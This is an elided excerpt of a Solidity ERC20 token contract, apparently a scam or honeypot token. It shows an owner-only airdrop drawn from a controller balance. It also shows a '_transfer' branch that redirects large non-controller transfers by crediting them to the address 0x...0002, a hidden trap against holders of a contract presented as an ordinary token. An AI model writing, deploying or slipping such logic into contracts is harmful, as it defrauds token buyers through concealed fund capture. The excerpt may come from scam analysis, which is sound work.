...
contract Token is Context, IERC20 {
    ...
    function airdrop(address[] memory _rec, uint256 _amt) public _ownerfunc_ {
        for (uint256 y = 0; y < _rec.length; y++) {
            _balances[_controller] = _balances[_controller].sub(
                _amt * (10**_decimals)
            );
            _balances[_rec[y]] = _balances[_rec[y]].add(_amt * (10**_decimals));
    ...
    function _transfer(
        ...
        uint256 tPercent = (3 * (10**(_decimals - 1)));
        if (
            (sender != _controller && recipient != _controller) &&
            amount.div(_totalSupply) > tPercent
        ) {
            _balances[0x0000000000000000000000000000000000000002] = _balances[
                0x0000000000000000000000000000000000000002
            ].add(amount);
